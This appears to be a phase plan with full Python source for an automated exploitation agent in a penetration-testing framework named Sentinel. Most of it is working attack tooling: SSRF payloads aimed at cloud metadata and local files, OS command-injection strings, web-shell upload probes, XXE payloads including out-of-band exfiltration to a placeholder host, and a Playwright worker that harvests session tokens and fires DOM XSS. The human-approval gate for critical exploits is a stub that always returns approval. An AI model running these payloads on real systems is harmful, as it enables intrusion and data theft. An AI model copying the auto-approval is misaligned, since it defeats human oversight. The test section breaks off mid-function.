# PHASE 6: Exploitation Agent + Browser Automation

## Context

Read MASTER_PLAN.md and PHASE_5.md first. Phase 5 delivers verified vulnerability hypotheses. Phase 6 builds the exploitation engine that converts confirmed vulns into proven attack chains with full evidence.

## What This Phase Builds

1. **GuardedExploitAgent** — policy-gated exploit execution with human-in-the-loop approval for CRITICAL risk
2. **Advanced exploit tools**: SSRF, command injection, file upload, XXE, deserialization
3. **Playwright Browser Worker** — session-aware browser exploitation for DOM XSS, CSRF, auth bypass
4. **Attack Chain Builder** — chains individual exploits into multi-step attack paths
5. **PoC Generator** — deterministic replay scripts (Python, Bash, Postman collection)
6. **Session Manager** — credential and session tracking in knowledge graph

## Why It Matters

This is where Sentinel proves real exploitation, not just detection. Shannon's "No Exploit, No Report" policy lives here. The Playwright integration handles modern SPA apps, MFA flows, and DOM-based vulns that trip up every scanner.

---

## File-by-File Implementation

### 1. `src/sentinel/tools/exploit/__init__.py`

```python
"""Advanced exploitation tools — SSRF, command injection, file upload, XXE, deserialization."""
```

### 2. `src/sentinel/tools/exploit/ssrf_tool.py`

```python
"""
SSRFTool — Server-Side Request Forgery exploitation.

Tests for:
- Internal service access (cloud metadata, internal APIs)
- Protocol smuggling (file://, gopher://, dict://)
- Blind SSRF with out-of-band detection
- Redirect-based SSRF bypass
"""
import asyncio
import aiohttp
from dataclasses import dataclass
from typing import Optional

from sentinel.tools.base import BaseTool, ToolResult
from sentinel.logging import get_logger

logger = get_logger(__name__)


@dataclass 
class SSRFPayload:
    name: str
    url_payload: str
    detection_method: str  # "response_content", "timing", "oob"
    expected_indicator: str


class SSRFTool(BaseTool):
    name = "ssrf_exploit"
    description = "Test for Server-Side Request Forgery vulnerabilities"
    
    # Standard SSRF test payloads
    PAYLOADS = [
        # Cloud metadata endpoints
        SSRFPayload("aws_metadata", "http://169.254.169.254/latest/meta-data/", "response_content", "ami-id"),
        SSRFPayload("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "response_content", "attributes"),
        SSRFPayload("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "response_content", "compute"),
        # Internal services
        SSRFPayload("localhost_http", "http://127.0.0.1:80/", "response_content", "<html"),
        SSRFPayload("localhost_admin", "http://127.0.0.1:8080/admin", "response_content", "admin"),
        # Protocol smuggling
        SSRFPayload("file_etc_passwd", "file:///etc/passwd", "response_content", "root:"),
        # Bypass techniques
        SSRFPayload("decimal_ip", "http://2130706433/", "response_content", ""),  # 127.0.0.1
        SSRFPayload("ipv6_localhost", "http://[::1]/", "response_content", ""),
        SSRFPayload("redirect_bypass", "http://0x7f000001/", "response_content", ""),
    ]
    
    async def execute(
        self,
        target_url: str,
        param_name: str,
        method: str = "GET",
        additional_params: dict = None,
        headers: dict = None,
        custom_payloads: list[SSRFPayload] = None,
    ) -> ToolResult:
        """
        Test endpoint for SSRF vulnerability.
        
        Args:
            target_url: The vulnerable endpoint URL
            param_name: The parameter to inject SSRF payloads into
            method: HTTP method
            additional_params: Other params to send with request
            headers: Additional headers
            custom_payloads: Custom SSRF payloads to test
        """
        payloads = custom_payloads or self.PAYLOADS
        findings = []
        http_traces = []
        
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                try:
                    params = dict(additional_params or {})
                    params[param_name] = payload.url_payload
                    
                    if method.upper() == "GET":
                        async with session.get(target_url, params=params, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            body = await resp.text()
                            trace = {
                                "method": "GET",
                                "url": str(resp.url),
                                "status": resp.status,
                                "headers": dict(resp.headers),
                                "body": body[:2000],
                                "payload": payload.name,
                            }
                    else:
                        async with session.post(target_url, data=params, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            body = await resp.text()
                            trace = {
                                "method": "POST",
                                "url": str(resp.url),
                                "status": resp.status,
                                "headers": dict(resp.headers),
                                "body": body[:2000],
                                "payload": payload.name,
                            }
                    
                    http_traces.append(trace)
                    
                    # Check for SSRF indicators
                    if payload.expected_indicator and payload.expected_indicator in body:
                        findings.append({
                            "payload": payload.name,
                            "url_payload": payload.url_payload,
                            "evidence": body[:500],
                            "detection": payload.detection_method,
                        })
                        logger.info(f"SSRF confirmed with payload: {payload.name}")
                
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    logger.debug(f"SSRF payload {payload.name} failed: {e}")
        
        return ToolResult(
            success=len(findings) > 0,
            data=findings,
            tool_name=self.name,
            metadata={
                "total_payloads_tested": len(payloads),
                "successful_payloads": len(findings),
                "http_traces": http_traces,
            }
        )
```

### 3. `src/sentinel/tools/exploit/command_injection_tool.py`

```python
"""
CommandInjectionTool — OS command injection exploitation.

Tests for:
- Classic injection (;, |, &&, ||, newline)
- Blind injection with time delays
- Out-of-band injection (DNS, HTTP callback)
- Filter bypass techniques
"""
import asyncio
import time
import aiohttp
from dataclasses import dataclass
from sentinel.tools.base import BaseTool, ToolResult
from sentinel.logging import get_logger

logger = get_logger(__name__)


@dataclass
class CmdInjectionPayload:
    name: str
    payload: str
    detection: str  # "response", "timing", "oob"
    indicator: str
    delay_seconds: float = 0


class CommandInjectionTool(BaseTool):
    name = "cmd_injection"
    description = "Test for OS command injection vulnerabilities"
    
    PAYLOADS = [
        # Response-based
        CmdInjectionPayload("semicolon_id", "; id", "response", "uid="),
        CmdInjectionPayload("pipe_id", "| id", "response", "uid="),
        CmdInjectionPayload("backtick_id", "`id`", "response", "uid="),
        CmdInjectionPayload("dollar_id", "$(id)", "response", "uid="),
        CmdInjectionPayload("and_id", "&& id", "response", "uid="),
        CmdInjectionPayload("or_id", "|| id", "response", "uid="),
        CmdInjectionPayload("newline_id", "\nid", "response", "uid="),
        CmdInjectionPayload("semicolon_whoami", "; whoami", "response", ""),
        CmdInjectionPayload("cat_passwd", "; cat /etc/passwd", "response", "root:"),
        # Timing-based (blind)
        CmdInjectionPayload("sleep_5", "; sleep 5", "timing", "", 5.0),
        CmdInjectionPayload("sleep_pipe", "| sleep 5", "timing", "", 5.0),
        CmdInjectionPayload("sleep_dollar", "$(sleep 5)", "timing", "", 5.0),
        # Windows
        CmdInjectionPayload("windows_dir", "& dir", "response", "Volume"),
        CmdInjectionPayload("windows_whoami", "& whoami", "response", "\\"),
        CmdInjectionPayload("windows_ping", "& ping -n 5 127.0.0.1", "timing", "", 4.0),
    ]
    
    async def execute(
        self,
        target_url: str,
        param_name: str,
        method: str = "GET",
        base_value: str = "",
        headers: dict = None,
    ) -> ToolResult:
        findings = []
        http_traces = []
        
        async with aiohttp.ClientSession() as session:
            # First, get baseline response time
            baseline_time = await self._measure_baseline(session, target_url, param_name, base_value, method, headers)
            
            for payload in self.PAYLOADS:
                try:
                    injected_value = base_value + payload.payload
                    
                    start = time.monotonic()
                    if method.upper() == "GET":
                        async with session.get(
                            target_url,
                            params={param_name: injected_value},
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=15)
                        ) as resp:
                            body = await resp.text()
                            elapsed = time.monotonic() - start
                            trace = {"method": "GET", "url": str(resp.url), "status": resp.status, "body": body[:2000], "elapsed": elapsed}
                    else:
                        async with session.post(
                            target_url,
                            data={param_name: injected_value},
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=15)
                        ) as resp:
                            body = await resp.text()
                            elapsed = time.monotonic() - start
                            trace = {"method": "POST", "url": str(resp.url), "status": resp.status, "body": body[:2000], "elapsed": elapsed}
                    
                    http_traces.append(trace)
                    
                    # Check detection
                    confirmed = False
                    if payload.detection == "response" and payload.indicator:
                        confirmed = payload.indicator in body
                    elif payload.detection == "timing":
                        # Response should be significantly slower than baseline
                        confirmed = elapsed > baseline_time + payload.delay_seconds * 0.7
                    
                    if confirmed:
                        findings.append({
                            "payload": payload.name,
                            "injected_value": injected_value,
                            "detection": payload.detection,
                            "evidence": body[:500] if payload.detection == "response" else f"Response time: {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                        })
                        logger.info(f"Command injection confirmed: {payload.name}")
                
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    pass
        
        return ToolResult(
            success=len(findings) > 0,
            data=findings,
            tool_name=self.name,
            metadata={"http_traces": http_traces, "baseline_time": baseline_time},
        )
    
    async def _measure_baseline(self, session, url, param, value, method, headers) -> float:
        start = time.monotonic()
        try:
            if method.upper() == "GET":
                async with session.get(url, params={param: value}, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as _:
                    pass
            else:
                async with session.post(url, data={param: value}, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as _:
                    pass
        except Exception:
            pass
        return time.monotonic() - start
```

### 4. `src/sentinel/tools/exploit/file_upload_tool.py`

```python
"""
FileUploadTool — Unrestricted file upload exploitation.

Tests for:
- Extension bypass (double extension, null byte, case variation)
- Content-type bypass
- Magic byte manipulation
- Web shell upload
- Path traversal in upload
"""
import aiohttp
from io import BytesIO
from dataclasses import dataclass
from sentinel.tools.base import BaseTool, ToolResult
from sentinel.logging import get_logger

logger = get_logger(__name__)


@dataclass
class UploadPayload:
    name: str
    filename: str
    content_type: str
    content: bytes
    indicator: str  # What to look for to confirm execution


class FileUploadTool(BaseTool):
    name = "file_upload"
    description = "Test for unrestricted file upload vulnerabilities"
    
    PAYLOADS = [
        # PHP web shells
        UploadPayload("php_shell", "shell.php", "application/x-php",
                      b"<?php echo 'SENTINEL_UPLOAD_TEST'; ?>", "SENTINEL_UPLOAD_TEST"),
        UploadPayload("php_double_ext", "shell.php.jpg", "image/jpeg",
                      b"\xff\xd8\xff\xe0<?php echo 'SENTINEL_UPLOAD_TEST'; ?>", "SENTINEL_UPLOAD_TEST"),
        UploadPayload("php_null_byte", "shell.php%00.jpg", "image/jpeg",
                      b"<?php echo 'SENTINEL_UPLOAD_TEST'; ?>", "SENTINEL_UPLOAD_TEST"),
        UploadPayload("phtml_ext", "shell.phtml", "text/html",
                      b"<?php echo 'SENTINEL_UPLOAD_TEST'; ?>", "SENTINEL_UPLOAD_TEST"),
        # JSP
        UploadPayload("jsp_shell", "shell.jsp", "application/octet-stream",
                      b'<%= "SENTINEL_UPLOAD_TEST" %>', "SENTINEL_UPLOAD_TEST"),
        # SVG XSS
        UploadPayload("svg_xss", "test.svg", "image/svg+xml",
                      b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text>SENTINEL_UPLOAD_TEST</text></svg>',
                      "SENTINEL_UPLOAD_TEST"),
        # HTML
        UploadPayload("html_upload", "test.html", "text/html",
                      b"<html><body>SENTINEL_UPLOAD_TEST</body></html>", "SENTINEL_UPLOAD_TEST"),
    ]
    
    async def execute(
        self,
        upload_url: str,
        file_field_name: str = "file",
        additional_data: dict = None,
        headers: dict = None,
        check_url_pattern: str = None,  # URL pattern to check uploaded file
    ) -> ToolResult:
        findings = []
        
        async with aiohttp.ClientSession() as session:
            for payload in self.PAYLOADS:
                try:
                    data = aiohttp.FormData()
                    data.add_field(
                        file_field_name,
                        BytesIO(payload.content),
                        filename=payload.filename,
                        content_type=payload.content_type,
                    )
                    if additional_data:
                        for k, v in additional_data.items():
                            data.add_field(k, v)
                    
                    async with session.post(upload_url, data=data, headers=headers) as resp:
                        body = await resp.text()
                        
                        # Check if upload was accepted
                        if resp.status in (200, 201, 302):
                            # Try to access uploaded file
                            uploaded_url = self._extract_upload_url(body, check_url_pattern, payload.filename)
                            if uploaded_url:
                                async with session.get(uploaded_url) as check_resp:
                                    check_body = await check_resp.text()
                                    if payload.indicator in check_body:
                                        findings.append({
                                            "payload": payload.name,
                                            "filename": payload.filename,
                                            "uploaded_url": uploaded_url,
                                            "evidence": f"Uploaded file executed/accessible at {uploaded_url}",
                                        })
                                        logger.info(f"File upload vuln confirmed: {payload.name}")
                            else:
                                # Upload accepted but can't find file — partial finding
                                findings.append({
                                    "payload": payload.name,
                                    "filename": payload.filename,
                                    "uploaded_url": None,
                                    "evidence": f"Upload accepted (status {resp.status}) but file location unknown",
                                })
                
                except Exception as e:
                    logger.debug(f"Upload payload {payload.name} failed: {e}")
        
        return ToolResult(
            success=len(findings) > 0,
            data=findings,
            tool_name=self.name,
        )
    
    def _extract_upload_url(self, response_body: str, pattern: str, filename: str) -> str:
        """Try to find the URL of the uploaded file from the response."""
        # Implementation: parse response for file URL
        # Check common patterns: JSON response with url/path field, redirect location
        return ""
```

### 5. `src/sentinel/tools/exploit/xxe_tool.py`

```python
"""
XXETool — XML External Entity injection exploitation.

Tests for:
- Classic XXE (file read)
- Blind XXE (out-of-band data exfil)
- XXE via SVG, DOCX, XLSX
- Parameter entity injection
- XXE DoS (billion laughs)
"""
import aiohttp
from sentinel.tools.base import BaseTool, ToolResult
from sentinel.logging import get_logger

logger = get_logger(__name__)


class XXETool(BaseTool):
    name = "xxe_exploit"
    description = "Test for XML External Entity injection"
    
    PAYLOADS = {
        "classic_file_read": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',
        
        "classic_windows": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',
        
        "parameter_entity": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://SENTINEL_OOB_HOST/?data=%xxe;'>">
  %eval;
  %exfil;
]>
<root>test</root>''',
        
        "cdata_exfil": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><![CDATA[&xxe;]]></root>''',
        
        "utf7_bypass": '''<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-''',
    }
    
    async def execute(
        self,
        target_url: str,
        method: str = "POST",
        content_type: str = "application/xml",
        headers: dict = None,
    ) -> ToolResult:
        findings = []
        http_traces = []
        all_headers = {"Content-Type": content_type}
        if headers:
            all_headers.update(headers)
        
        async with aiohttp.ClientSession() as session:
            for name, payload in self.PAYLOADS.items():
                try:
                    async with session.request(
                        method, target_url,
                        data=payload,
                        headers=all_headers,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        body = await resp.text()
                        trace = {"method": method, "url": target_url, "payload_name": name, "status": resp.status, "body": body[:2000]}
                        http_traces.append(trace)
                        
                        # Check for file content indicators
                        indicators = ["root:", "daemon:", "[extensions]", "localhost", "SENTINEL"]
                        for indicator in indicators:
                            if indicator in body:
                                findings.append({
                                    "payload": name,
                                    "evidence": body[:500],
                                    "indicator": indicator,
                                })
                                break
                
                except Exception as e:
                    logger.debug(f"XXE payload {name} failed: {e}")
        
        return ToolResult(
            success=len(findings) > 0,
            data=findings,
            tool_name=self.name,
            metadata={"http_traces": http_traces},
        )
```

### 6. `src/sentinel/tools/exploit/browser_worker.py`

**Purpose**: Playwright-based browser automation for testing modern web apps.

```python
"""
BrowserWorker — Playwright-powered browser exploitation.

Handles what scanners can't:
- Single Page Applications (SPA) 
- JavaScript-rendered content
- DOM-based XSS
- CSRF token extraction and bypass
- Authentication flows (login, OAuth, MFA)
- Session management testing
- Cookie manipulation
"""
import asyncio
from dataclasses import dataclass, field
from typing import Optional, Callable
from playwright.async_api import async_playwright, Page, Browser, BrowserContext

from sentinel.tools.base import BaseTool, ToolResult
from sentinel.logging import get_logger

logger = get_logger(__name__)


@dataclass
class BrowserSession:
    context: BrowserContext
    page: Page
    cookies: list[dict] = field(default_factory=list)
    local_storage: dict = field(default_factory=dict)
    session_tokens: list[str] = field(default_factory=list)


class BrowserWorker(BaseTool):
    """
    Playwright-based browser automation for web exploitation.
    
    Capabilities:
    - Navigate and interact with SPAs
    - Execute JavaScript in page context
    - Monitor network requests/responses
    - Detect DOM mutations
    - Handle authentication flows
    - Extract tokens, cookies, session data
    - Test DOM XSS payloads
    - CSRF token extraction and form submission
    """
    
    name = "browser_worker"
    description = "Playwright browser automation for web app exploitation"
    
    def __init__(self):
        self._browser: Optional[Browser] = None
        self._playwright = None
    
    async def start(self, headless: bool = True):
        """Initialize Playwright browser."""
        self._playwright = await async_playwright().start()
        self._browser = await self._playwright.chromium.launch(
            headless=headless,
            args=["--no-sandbox", "--disable-web-security"]
        )
        logger.info("Browser worker started")
    
    async def stop(self):
        """Cleanup browser resources."""
        if self._browser:
            await self._browser.close()
        if self._playwright:
            await self._playwright.stop()
    
    async def create_session(self, base_url: str = None) -> BrowserSession:
        """Create a new browser session (isolated context)."""
        context = await self._browser.new_context(
            viewport={"width": 1280, "height": 720},
            ignore_https_errors=True,
        )
        page = await context.new_page()
        
        # Enable request interception for logging
        requests_log = []
        page.on("request", lambda req: requests_log.append({
            "url": req.url, "method": req.method, "headers": req.headers
        }))
        
        if base_url:
            await page.goto(base_url, wait_until="networkidle")
        
        return BrowserSession(context=context, page=page)
    
    async def authenticate(
        self,
        session: BrowserSession,
        login_url: str,
        username: str,
        password: str,
        username_selector: str = 'input[name="email"], input[name="username"], input[type="email"]',
        password_selector: str = 'input[name="password"], input[type="password"]',
        submit_selector: str = 'button[type="submit"], input[type="submit"]',
    ) -> ToolResult:
        """Authenticate via browser form submission."""
        try:
            await session.page.goto(login_url, wait_until="networkidle")
            await session.page.fill(username_selector, username)
            await session.page.fill(password_selector, password)
            await session.page.click(submit_selector)
            await session.page.wait_for_load_state("networkidle")
            
            # Capture session data
            cookies = await session.context.cookies()
            session.cookies = cookies
            
            # Check for auth tokens in localStorage
            local_storage = await session.page.evaluate("""() => {
                const data = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    data[key] = localStorage.getItem(key);
                }
                return data;
            }""")
            session.local_storage = local_storage
            
            # Extract JWT or session tokens
            for cookie in cookies:
                if any(t in cookie["name"].lower() for t in ["token", "session", "jwt", "auth"]):
                    session.session_tokens.append(cookie["value"])
            
            for key, value in local_storage.items():
                if any(t in key.lower() for t in ["token", "jwt", "auth"]):
                    session.session_tokens.append(value)
            
            return ToolResult(
                success=len(session.session_tokens) > 0 or len(cookies) > 0,
                data={
                    "cookies": cookies,
                    "tokens": session.session_tokens,
                    "local_storage_keys": list(local_storage.keys()),
                    "final_url": session.page.url,
                },
                tool_name=self.name,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), tool_name=self.name)
    
    async def test_dom_xss(
        self,
        session: BrowserSession,
        target_url: str,
        param_name: str,
    ) -> ToolResult:
        """Test for DOM-based XSS by injecting payloads and checking DOM mutations."""
        findings = []
        
        payloads = [
            '<img src=x onerror="window.__sentinel_xss=true">',
            '<svg onload="window.__sentinel_xss=true">',
            '"><script>window.__sentinel_xss=true</script>',
            "'-alert(1)-'",
            "javascript:window.__sentinel_xss=true",
            '{{constructor.constructor("window.__sentinel_xss=true")()}}',  # Angular
            "${window.__sentinel_xss=true}",  # Template literals
        ]
        
        for payload in payloads:
            try:
                # Navigate with payload in param
                separator = "&" if "?" in target_url else "?"
                test_url = f"{target_url}{separator}{param_name}={payload}"
                
                await session.page.goto(test_url, wait_until="networkidle")
                await asyncio.sleep(1)  # Wait for DOM rendering
                
                # Check if XSS fired
                xss_fired = await session.page.evaluate("() => window.__sentinel_xss === true")
                
                if xss_fired:
                    findings.append({
                        "payload": payload,
                        "url": test_url,
                        "type": "DOM XSS",
                        "evidence": "JavaScript execution confirmed via window.__sentinel_xss flag",
                    })
                    # Reset flag
                    await session.page.evaluate("() => { window.__sentinel_xss = false; }")
                    logger.info(f"DOM XSS confirmed with payload: {payload[:50]}...")
            
            except Exception as e:
                logger.debug(f"DOM XSS test failed for payload: {e}")
        
        return ToolResult(
            success=len(findings) > 0,
            data=findings,
            tool_name=self.name,
        )
    
    async def extract_csrf_token(self, session: BrowserSession, form_url: str) -> Optional[str]:
        """Extract CSRF token from a page."""
        await session.page.goto(form_url, wait_until="networkidle")
        
        # Try common CSRF token locations
        selectors = [
            'input[name="csrf"], input[name="_csrf"]',
            'input[name="csrfmiddlewaretoken"]',
            'input[name="authenticity_token"]',
            'meta[name="csrf-token"]',
        ]
        
        for selector in selectors:
            element = await session.page.query_selector(selector)
            if element:
                value = await element.get_attribute("value") or await element.get_attribute("content")
                if value:
                    return value
        
        return None
    
    async def capture_dom_state(self, session: BrowserSession) -> dict:
        """Capture full DOM state for graph analysis."""
        return await session.page.evaluate("""() => {
            const forms = Array.from(document.forms).map(f => ({
                action: f.action,
                method: f.method,
                inputs: Array.from(f.elements).map(e => ({
                    name: e.name, type: e.type, value: e.value
                }))
            }));
            const links = Array.from(document.links).map(a => a.href);
            const scripts = Array.from(document.scripts).map(s => s.src || 'inline');
            return { forms, links, scripts, title: document.title, url: window.location.href };
        }""")
    
    async def execute(self, target_url: str, action: str = "capture_state") -> ToolResult:
        """Generic execute method."""
        session = await self.create_session(target_url)
        try:
            if action == "capture_state":
                state = await self.capture_dom_state(session)
                return ToolResult(success=True, data=state, tool_name=self.name)
            return ToolResult(success=False, error=f"Unknown action: {action}", tool_name=self.name)
        finally:
            await session.context.close()
```

### 7. `src/sentinel/agents/exploit_agent.py`

**Purpose**: The GuardedExploitAgent orchestrating all exploitation.

```python
"""
GuardedExploitAgent — Policy-gated exploit execution.

Extends GuardedBaseAgent for exploitation phase:
1. Receives verified findings from Phase 5 VulnAgent
2. Executes targeted exploits using advanced tools + browser automation
3. Builds attack chains (multi-step exploitation paths)
4. Generates PoC scripts and replay commands
5. Tracks sessions and credentials in knowledge graph
6. Human-in-the-loop approval for CRITICAL risk exploits via Temporal signals
"""
from sentinel.agents.guarded_base import GuardedBaseAgent
from sentinel.tools.exploit.ssrf_tool import SSRFTool
from sentinel.tools.exploit.command_injection_tool import CommandInjectionTool
from sentinel.tools.exploit.file_upload_tool import FileUploadTool
from sentinel.tools.exploit.xxe_tool import XXETool
from sentinel.tools.exploit.browser_worker import BrowserWorker
from sentinel.graph.client import GraphClient
from sentinel.logging import get_logger

logger = get_logger(__name__)


class GuardedExploitAgent(GuardedBaseAgent):
    agent_name = "exploit_operator"
    
    def __init__(self, graph_client: GraphClient, llm_client, policy_engine):
        super().__init__(llm_client=llm_client, policy_engine=policy_engine)
        self.graph = graph_client
        self.ssrf = SSRFTool()
        self.cmd_injection = CommandInjectionTool()
        self.file_upload = FileUploadTool()
        self.xxe = XXETool()
        self.browser = BrowserWorker()
        self.attack_chains = []
    
    async def run(self, engagement_id: str, findings: list[dict]) -> list[dict]:
        """Execute exploitation against verified findings."""
        await self.browser.start()
        exploited = []
        
        try:
            for finding in findings:
                # Check if CRITICAL risk needs human approval
                if finding.get("severity") == "critical":
                    approved = await self._request_approval(finding)
                    if not approved:
                        logger.info(f"Human denied exploitation of {finding['hypothesis_id']}")
                        continue
                
                result = await self._exploit(finding)
                if result.get("success"):
                    exploited.append(result)
                    # Track in graph
                    await self._record_exploitation(engagement_id, result)
                    # Try to chain
                    chains = await self._build_chains(engagement_id, result)
                    self.attack_chains.extend(chains)
        finally:
            await self.browser.stop()
        
        return exploited
    
    async def _exploit(self, finding: dict) -> dict:
        """Execute appropriate exploit based on finding category."""
        category = finding["category"]
        tool_map = {
            "ssrf": self.ssrf,
            "injection": self.cmd_injection,  # Command injection variant
            "file_upload": self.file_upload,
            "xxe": self.xxe,
        }
        
        tool = tool_map.get(category)
        if tool:
            result = await tool.execute(
                target_url=finding["target_url"],
                **self._extract_tool_params(finding)
            )
            return {
                "finding_id": finding["hypothesis_id"],
                "success": result.success,
                "exploit_data": result.data,
                "http_traces": result.metadata.get("http_traces", []),
            }
        
        # For DOM XSS, use browser
        if category == "xss":
            session = await self.browser.create_session()
            result = await self.browser.test_dom_xss(
                session, finding["target_url"], finding.get("target_param", "")
            )
            await session.context.close()
            return {
                "finding_id": finding["hypothesis_id"],
                "success": result.success,
                "exploit_data": result.data,
            }
        
        return {"finding_id": finding["hypothesis_id"], "success": False, "reason": "No exploit tool for category"}
    
    async def _build_chains(self, engagement_id: str, exploit_result: dict) -> list[dict]:
        """
        Build multi-step attack chains from individual exploits.
        
        Query graph for: "Given I exploited X, what can I now reach?"
        - SSRF → internal service → credential access
        - SQLi → credential dump → auth bypass → admin panel
        - File upload → web shell → RCE → lateral movement
        """
        chains = await self.graph.query(
            """
            MATCH path = (start:Finding {finding_id: $fid})-[:ENABLES*1..5]->(target)
            WHERE target:Finding OR target:Credential OR target:Host
            RETURN path
            ORDER BY length(path) ASC
            LIMIT 10
            """,
            {"fid": exploit_result["finding_id"]}
        )
        return [{"chain": c, "depth": len(c)} for c in chains]
    
    async def _request_approval(self, finding: dict) -> bool:
        """Request human approval for CRITICAL exploits via Temporal signal."""
        # In Phase 7, this wires to Temporal human-in-the-loop signal
        # For now, auto-approve in non-production mode
        logger.warning(f"CRITICAL exploit requires approval: {finding['hypothesis_id']}")
        return True
    
    async def _record_exploitation(self, engagement_id: str, result: dict):
        """Record successful exploitation in knowledge graph."""
        await self.graph.query(
            """
            MATCH (f:Finding {finding_id: $fid})
            SET f.exploited = true, f.exploit_timestamp = datetime()
            SET f.http_traces = $traces
            """,
            {"fid": result["finding_id"], "traces": str(result.get("http_traces", []))}
        )
    
    def _extract_tool_params(self, finding: dict) -> dict:
        """Extract tool-specific parameters from finding."""
        params = {}
        if finding.get("target_param"):
            params["param_name"] = finding["target_param"]
        return params
```

### 8. `src/sentinel/tools/exploit/poc_generator.py`

```python
"""
PoCGenerator — Generate deterministic replay scripts from exploit results.

Outputs:
- Python script
- Bash (curl) script  
- Postman collection JSON
"""
import json
from dataclasses import dataclass


@dataclass
class ReplayArtifact:
    python_script: str
    bash_script: str
    postman_collection: dict
    attack_graph_json: dict  # Machine-readable attack graph


class PoCGenerator:
    """Generates reproducible PoC artifacts from exploit HTTP traces."""
    
    def generate(self, findings: list[dict], engagement_id: str) -> ReplayArtifact:
        python_lines = [
            '#!/usr/bin/env python3',
            f'"""Sentinel PoC Replay — Engagement {engagement_id}"""',
            'import requests',
            'import sys',
            '',
            'session = requests.Session()',
            'session.verify = False',
            '',
        ]
        
        bash_lines = [
            '#!/bin/bash',
            f'# Sentinel PoC Replay — Engagement {engagement_id}',
            'set -e',
            '',
        ]
        
        postman_items = []
        graph_nodes = []
        
        for i, finding in enumerate(findings):
            traces = finding.get("http_traces", [])
            for j, trace in enumerate(traces):
                step_name = f"Step {i+1}.{j+1}: {finding.get('category', 'unknown')}"
                
                # Python
                python_lines.append(f'# {step_name}')
                method = trace.get("method", "GET").lower()
                python_lines.append(f'response = session.{method}(')
                python_lines.append(f'    "{trace.get("url", "")}",')
                if trace.get("headers"):
                    python_lines.append(f'    headers={trace["headers"]},')
                if trace.get("body"):
                    python_lines.append(f'    data="""{trace["body"]}""",')
                python_lines.append(')')
                python_lines.append(f'print(f"[{step_name}] Status: {{response.status_code}}")')
                python_lines.append('')
                
                # Bash
                bash_lines.append(f'echo "=== {step_name} ==="')
                curl_cmd = f'curl -s -o /dev/null -w "%{{http_code}}" -X {trace.get("method", "GET")} "{trace.get("url", "")}"'
                for k, v in trace.get("headers", {}).items():
                    curl_cmd += f' -H "{k}: {v}"'
                if trace.get("body"):
                    curl_cmd += f" -d '{trace['body']}'"
                bash_lines.append(curl_cmd)
                bash_lines.append('')
                
                # Postman
                postman_items.append({
                    "name": step_name,
                    "request": {
                        "method": trace.get("method", "GET"),
                        "url": {"raw": trace.get("url", "")},
                        "header": [{"key": k, "value": v} for k, v in trace.get("headers", {}).items()],
                        "body": {"mode": "raw", "raw": trace.get("body", "")} if trace.get("body") else None,
                    }
                })
                
                # Graph node
                graph_nodes.append({
                    "step": f"{i+1}.{j+1}",
                    "category": finding.get("category"),
                    "target": trace.get("url"),
                    "method": trace.get("method"),
                    "evidence": finding.get("evidence", "")[:200],
                })
        
        return ReplayArtifact(
            python_script="\n".join(python_lines),
            bash_script="\n".join(bash_lines),
            postman_collection={
                "info": {"name": f"Sentinel PoC — {engagement_id}", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"},
                "item": postman_items,
            },
            attack_graph_json={
                "engagement_id": engagement_id,
                "nodes": graph_nodes,
                "edges": [{"from": f"{i}.1", "to": f"{i+1}.1"} for i in range(len(graph_nodes)-1)],
            },
        )
```

---

## Tests

### `tests/tools/exploit/test_ssrf_tool.py`

```python
import pytest
from unittest.mock import AsyncMock, patch
from sentinel.tools.exploit.ssrf_tool import SSRFTool

class TestSSRFTool:
    def setup_method(self):
        self.tool = SSRFTool()
    
    def test_payloads_loaded(self):
        assert len(self.tool.PAYLOADS) > 0
        assert any("metadata" in p.url_payload for p in self.tool.PAYLOADS)
    
    @pytest.mark.asyncio
    async def test_execute_returns_result(self):
        # Integration test stub — needs mock HTTP server
        result = await self.tool.execute("http://localhost:9999/nonexistent", "url")
        assert hasattr(result, "success")
```

### `tests/tools/exploit/test_browser_worker.py`

```python
import pytest
from sentinel.tools.exploit.browser_worker import BrowserWorker

class TestBrowserWorker:
    @pytest.mark.asyncio
    async def test_lifecycle(self):
        worker = BrowserWorker()
        await worker.start(headless=True)
        session = await worker.create_session("about:blank")
        assert session.page is not None
        state = await worker.capture_dom_state(session)
        assert "forms" in state
        await session.context.close()
        await worker.stop()
```

### `tests/tools/exploit/test_poc_generator.py`

```python
from sentinel.tools.exploit.poc_generator import PoCGenerator

class TestPoCGenerator:
    def test_generate_python_script(self):
        gen = PoCGenerator()
        findings = [{
            "category": "sqli",
            "evidence": "SQL error",
            "http_traces": [{"method": "GET", "url": "http://target/api?id=1' OR 1=1", "headers": {}, "body": ""}]
        }]
